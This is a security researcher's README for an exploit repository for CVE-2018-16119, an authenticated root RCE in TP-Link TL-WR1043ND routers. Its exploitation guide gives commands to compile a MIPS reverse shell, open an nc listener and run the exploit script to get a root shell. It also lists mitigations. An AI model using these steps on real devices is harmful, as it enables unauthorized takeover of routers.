# CVE-2018-16119: Authenticated Remote Code Execution in TP-Link WR1043ND

## Overview

CVE-2018-16119 is a critical authenticated remote code execution vulnerability affecting TP-Link TL-WR1043ND routers. This vulnerability allows authenticated attackers to execute arbitrary commands on the target device with root privileges, potentially leading to complete system compromise.

**CVE Details:** [CVE-2018-16119](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16119)

## Vulnerability Impact

- **Attack Vector:** Network
- **Attack Complexity:** Low  
- **Privileges Required:** Low (Authentication needed)
- **User Interaction:** None
- **Scope:** Changed
- **Impact:** Complete compromise of device confidentiality, integrity, and availability

Once exploited, an attacker gains root shell access to the router, enabling them to:
- Modify router configurations
- Monitor network traffic
- Use the device as a pivot point for lateral movement
- Install persistent backdoors
- Disrupt network connectivity

## Affected Devices

- TP-Link TL-WR1043ND (multiple firmware versions)
- Potentially other TP-Link devices using similar firmware

## Prerequisites

### System Requirements
- Linux host with root privileges (required for TFTP server on port 69)
- Docker (for cross-compilation)
- Network connectivity to target device
- Valid authentication credentials for the target router

### Dependencies
```bash
# Install required packages
sudo apt-get update
sudo apt-get install netcat docker.io
```

## Exploitation Guide

### Step 1: Compile the Reverse Shell Payload

The exploit requires a MIPS big-endian reverse shell binary. Follow these steps to compile it:

```bash
# Copy the source code to /tmp
cp exploit/tftp_server/reverse_shell_mipsbe.c /tmp/

# Use Docker container with MIPS cross-compilation tools
docker run -v /tmp/:/tmp/ -it asmimproved/qemu-mips /bin/bash
```

Inside the Docker container:
```bash
cd /tmp
mips-linux-gnu-gcc -static reverse_shell_mipsbe.c -o shh
```

Exit Docker and copy the compiled binary:
```bash
cp /tmp/shh exploit/tftp_server/
```

### Step 2: Set Up the Reverse Shell Listener

Open a terminal and start a netcat listener on port 9669:

**Linux:**
```bash
nc -l -p 9669 -vv
```

**macOS:**
```bash
nc -l 9669 -vv
```

### Step 3: Execute the Exploit

Run the exploit script with root privileges (required for TFTP server):

```bash
sudo python3 exploit/exploit.py
```

The script will:
1. Authenticate to the target router
2. Start a TFTP server on port 69
3. Exploit the vulnerability to download and execute the reverse shell
4. Establish a connection back to your listener

### Step 4: Interact with the Shell

Once the connection is established:
- You will have root access to the router
- No verbose output will be displayed initially
- Simply start typing commands to interact with the shell

## Project Structure

```
CVE-2018-16119/
├── exploit/
│   ├── exploit.py              # Main exploit script
│   ├── requirements.txt        # Python dependencies
│   ├── notes.txt              # Additional notes
│   └── tftp_server/
│       ├── reverse_shell_mipsbe.c  # Reverse shell source code
│       └── shh                     # Compiled MIPS binary
├── firmware/
│   └── wr740nv4_webrevert.bin     # Sample firmware
├── squashfs-root/                  # Extracted firmware filesystem
└── README.md                       # This file
```

## Security Considerations

### Responsible Disclosure
This vulnerability has been responsibly disclosed and should only be used for:
- Authorized penetration testing
- Security research in controlled environments
- Educational purposes

### Legal Notice
⚠️ **WARNING**: This exploit is provided for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal and unethical. Users are responsible for ensuring they have proper authorization before using this tool.

### Mitigation Recommendations
- Update to the latest firmware version
- Change default administrative credentials
- Disable remote management if not required
- Implement network segmentation
- Monitor for suspicious network activity

## Dependencies

Install Python requirements:
```bash
pip3 install -r exploit/requirements.txt
```

## Troubleshooting

### Common Issues

**TFTP Server Permission Denied:**
- Ensure the script is run with root privileges
- Check that port 69 is not already in use

**Connection Failed:**
- Verify network connectivity to target
- Confirm authentication credentials are correct
- Check firewall settings

**No Shell Response:**
- The shell may take a moment to initialize
- Try pressing Enter or typing basic commands like `id` or `pwd`

## Research & Development

This research demonstrates critical security flaws in embedded device firmware. The vulnerability highlights the importance of:
- Secure coding practices in embedded systems
- Regular security audits of IoT devices
- Timely firmware updates and patch management

## References

- [CVE-2018-16119 Official Entry](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16119)
- [TP-Link Security Advisories](https://www.tp-link.com/us/support/security-updates/)

## Contact & Attribution

**Research by:** Alejandro Parodi  
**Twitter:** [@hdbreaker](https://twitter.com/hdbreaker_)  
**LinkedIn:** [Alejandro Parodi](https://linkedin.com/in/alejandro-parodi)

---

*This research was conducted for educational purposes and to improve the security of embedded systems. Please use responsibly.*
